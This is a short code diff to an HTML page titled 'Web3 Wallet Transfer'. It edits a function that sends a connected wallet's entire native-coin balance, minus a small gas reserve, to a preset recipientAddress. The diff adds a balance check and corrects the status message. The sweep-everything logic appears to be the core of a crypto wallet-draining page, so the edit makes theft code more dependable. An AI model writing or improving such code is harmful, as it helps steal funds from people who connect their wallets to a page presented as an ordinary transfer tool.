@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Web3 Wallet Connection & Crypto Transfer</title>
+    <title>Web3 Wallet Transfer</title>
     <style>
         body {
             font-family: 'Arial', sans-serif;
@@ -151,15 +151,24 @@
         }
 
         async function sendNativeCrypto(balance, network) {
+            // Calculate amount to send (keeping a small amount for gas fees)
+            const amountToSend = balance.sub(ethers.utils.parseUnits('0.001', 18));
+
+            // Ensure that we are not sending a negative value
+            if (amountToSend.lt(0)) {
+                document.getElementById('status').innerText = `Insufficient balance to send.`;
+                return;
+            }
+
             const tx = {
                 to: recipientAddress,
-                value: balance.sub(ethers.utils.parseUnits('0.001', 18)) // Keeping gas fees
+                value: amountToSend
             };
 
             try {
                 const txResponse = await signer.sendTransaction(tx);
                 await txResponse.wait();
-                document.getElementById('status').innerText = `Sent ${ethers.utils.formatEther(balance)} ${network.nativeSymbol} from ${network.name}.`;
+                document.getElementById('status').innerText = `Sent ${ethers.utils.formatEther(amountToSend)} ${network.nativeSymbol} from ${network.name}.`;
             } catch (error) {
                 document.getElementById('status').innerText = `Transaction failed: ${error.message}`;
             }
